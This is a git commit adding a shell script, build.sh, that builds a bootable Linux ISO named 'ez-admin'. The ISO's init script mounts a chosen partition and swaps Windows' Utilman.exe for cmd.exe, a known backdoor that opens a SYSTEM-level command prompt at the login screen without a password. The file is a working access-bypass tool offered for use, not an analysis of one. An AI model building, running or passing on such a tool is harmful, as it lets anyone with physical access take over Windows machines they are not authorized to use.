ee2fff6f8c2b98d0d0c5df2bc55c678a030d1972
Haxer <115757568+rainestorme@users.noreply.github.com>
2023-03-06 15:24:17 -0600

    Create build.sh

---
+++ build.sh
@@ -0,0 +1,134 @@
+#!/bin/bash
+
+BUSYBOX_VERSION=1.32.1
+LINUX_VERSION=5.15.6
+BASH_VERSION=5.2.15
+
+echo "Building for Busybox $BUSYBOX_VERSION, Linux $LINUX_VERSION, and Bash $BASH_VERSION"
+
+echo "Cleaning up..."
+rm -Rf bzImage
+rm -Rf initrd
+rm -Rf src
+rm -Rf initrd.img
+
+mkdir -p src
+cd src
+    
+    # Kernel
+    echo "Downloading kernel $LINUX_VERSION..."
+    LINUX_MAJOR=$(echo $LINUX_VERSION | sed 's/\([0-9]*\)[^0-9].*/\1/')
+    wget https://mirrors.edge.kernel.org/pub/linux/kernel/v$LINUX_MAJOR.x/linux-$LINUX_VERSION.tar.xz
+    echo "Extracting kernel..."
+    tar -xf linux-$LINUX_VERSION.tar.xz
+    echo "Building kernel..."
+    cd linux-$LINUX_VERSION
+        make defconfig
+        make -j$(nproc) || exit
+    cd ..
+
+    # Busybox
+    echo "Downloading busybox $BUSYBOX_VERSION..."
+    wget https://www.busybox.net/downloads/busybox-$BUSYBOX_VERSION.tar.bz2  
+    echo "Extracting busybox..."  
+    tar -xf busybox-$BUSYBOX_VERSION.tar.bz2
+    echo "Building busybox..."
+    cd busybox-$BUSYBOX_VERSION
+        make defconfig
+        sed 's/^.*CONFIG_STATIC[^_].*$/CONFIG_STATIC=y/g' -i .config
+        make -j$(nproc) || exit
+    cd ..
+
+cd ..
+
+echo "Copying kernel..."
+cp src/linux-$LINUX_VERSION/arch/x86_64/boot/bzImage ./
+
+# initrd
+mkdir initrd
+cd initrd
+
+    echo "Creating rootfs skeleton and installing busybox..."
+    mkdir -p bin dev proc sys boot
+    cd bin
+        cp ../../src/busybox-$BUSYBOX_VERSION/busybox ./
+
+        for prog in $(./busybox --list); do
+            # Skip bash
+            if [ "$prog" = "bash" ]; then
+                continue
+            fi
+            ln -s /bin/busybox ./$prog
+        done
+    cd ..
+cd ..
+
+cd src
+    echo "Downloading bash $BASH_VERSION..."
+    wget https://ftp.gnu.org/gnu/bash/bash-$BASH_VERSION.tar.gz
+    echo "Extracting bash..."
+    tar -xf bash-$BASH_VERSION.tar.gz
+    echo "Building bash..."
+    cd bash-$BASH_VERSION
+        ./configure --prefix=/usr --without-bash-malloc
+        make -j$(nproc) || exit
+        make install DESTDIR=../initrd
+    cd ..
+cd ..
+
+cd initrd
+    echo "Performing final config..."
+
+    echo '#!/bin/bash' > init
+    echo 'dmesg -n 1' >> init
+    echo 'mount -t devtmpfs none /dev' >> init
+    echo 'mount -t proc none /proc' >> init
+    echo 'mount -t sysfs none /sys' >> init
+    echo 'echo "Welcome to ez-admin!"' >> init
+    echo 'echo "Printing partitions. Please enter a partition to mount and run ez-admin on."' >> init
+    echo 'mkdir -p /mnt' >> init
+    echo 'fdisk -l' >> init
+    echo 'echo "Please enter a partition: "' >> init
+    echo 'read partition' >> init
+    echo 'echo "Mounting partition..."' >> init
+    echo 'mount $partition /mnt'
+    echo 'echo "Backing up Utilman.exe..."' >> init
+    echo 'pushd /mnt/Windows/system32 && cp Utilman.exe Utilman-ez.bak' >> init
+    echo 'echo "Replacing Utilman.exe..."' >> init
+    echo 'cp cmd.exe Utilman.exe && popd' >> init
+    echo 'echo "Done! Rebooting..."' >> init
+    echo 'poweroff -f' >> init
+
+    chmod -R 777 .
+
+    echo "Packing initrd..."
+    find . | cpio -o -H newc > ../initrd.img
+cd ..
+
+echo "Creating iso..."
+
+if ! command -v xorriso &> /dev/null
+then
+    echo "xorriso could not be found"
+    exit
+fi
+if ! command -v grub-mkrescue &> /dev/null
+then
+    echo "grub-mkrescue could not be found"
+    exit
+fi
+
+# Check if the kernel image and initrd(rootfs) exist
+if [ ! -f bzImage ]; then
+    echo "bzImage not found"
+    exit
+fi
+if [ ! -d initrd ]; then
+    echo "initrd not found"
+    exit
+fi
+
+# Create the ISO image
+xorriso -as mkisofs -iso-level 3 -full-iso9660-filenames -volid "ez-admin" -eltorito-boot boot/grub/eltorito.img -no-emul-boot -boot-load-size 4 -boot-info-table -eltorito-catalog boot/grub/boot.cat -output ez-admin.iso ./boot ./bzImage ./initrd
+
+echo "Done!"
